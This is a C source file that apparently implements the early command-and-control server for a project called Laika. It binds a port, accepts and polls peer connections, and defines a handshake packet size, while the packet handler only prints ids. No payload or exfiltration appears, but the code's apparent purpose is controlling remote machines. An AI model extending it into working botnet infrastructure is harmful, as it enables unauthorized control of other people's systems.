#include "lmem.h"
#include "lerror.h"

#include "cnc.h"

size_t laikaC_pktSizeTbl[LAIKAPKT_MAXNONE] = {
    [LAIKAPKT_HANDSHAKE_REQ] = LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t)
};

void laikaC_pktHandler(struct sLaika_peer *peer, uint8_t id, void *uData) {
    printf("got %d packet id!\n", id);
}

struct sLaika_cnc *laikaC_newCNC(uint16_t port) {
    struct sLaika_cnc *cnc = laikaM_malloc(sizeof(struct sLaika_cnc));

    /* init socket & pollList */
    laikaS_initSocket(&cnc->sock);
    laikaP_initPList(&cnc->pList);

    /* bind sock to port */
    laikaS_bind(&cnc->sock, port);

    /* add sock to pollList */
    laikaP_addSock(&cnc->pList, &cnc->sock);

    return cnc;
}

void laikaC_freeCNC(struct sLaika_cnc *cnc) {
    laikaS_cleanSocket(&cnc->sock);
    laikaP_cleanPList(&cnc->pList);
    laikaM_free(cnc);
}

void laikaC_killPeer(struct sLaika_cnc *cnc, struct sLaika_peer *peer) {
    printf("peer %x killed!\n", peer);
    laikaP_rmvSock(&cnc->pList, (struct sLaika_socket*)peer);
    laikaS_kill(&peer->sock);
}

bool laikaC_pollPeers(struct sLaika_cnc *cnc, int timeout) {
    struct sLaika_peer *peer;
    struct sLaika_pollEvent *evnts;
    int numEvents, i;

    evnts = laikaP_poll(&cnc->pList, timeout, &numEvents);

    /* if we have 0 events, we reached the timeout, let the caller know */
    if (numEvents == 0) {
        return false;
    }

    /* walk through and handle each event */
    for (i = 0; i < numEvents; i++) {
        if (evnts[i].sock == &cnc->sock) { /* event on listener? */
            peer = laikaS_newPeer(
                laikaC_pktHandler,
                laikaC_pktSizeTbl,
                &cnc->pList,
                (void*)cnc
            );

            /* setup and accept new peer */
            laikaS_acceptFrom(&peer->sock, &cnc->sock);
            laikaS_setNonBlock(&peer->sock);

            /* add to our pollList */
            laikaP_addSock(&cnc->pList, &peer->sock);

            printf("new peer %x!\n", peer);
            continue;
        }

        peer = (struct sLaika_peer*)evnts[i].sock;

        LAIKA_TRY
            if (evnts[i].pollIn && !laikaS_handlePeerIn(peer))
                laikaC_killPeer(cnc, peer);

            if (evnts[i].pollOut && !laikaS_handlePeerOut(peer))
                laikaC_killPeer(cnc, peer);

            if (!evnts[i].pollIn && !evnts[i].pollOut)
                laikaC_killPeer(cnc, peer);

        LAIKA_CATCH
            laikaC_killPeer(cnc, peer);
        LAIKA_TRYEND
    }

    return true;
}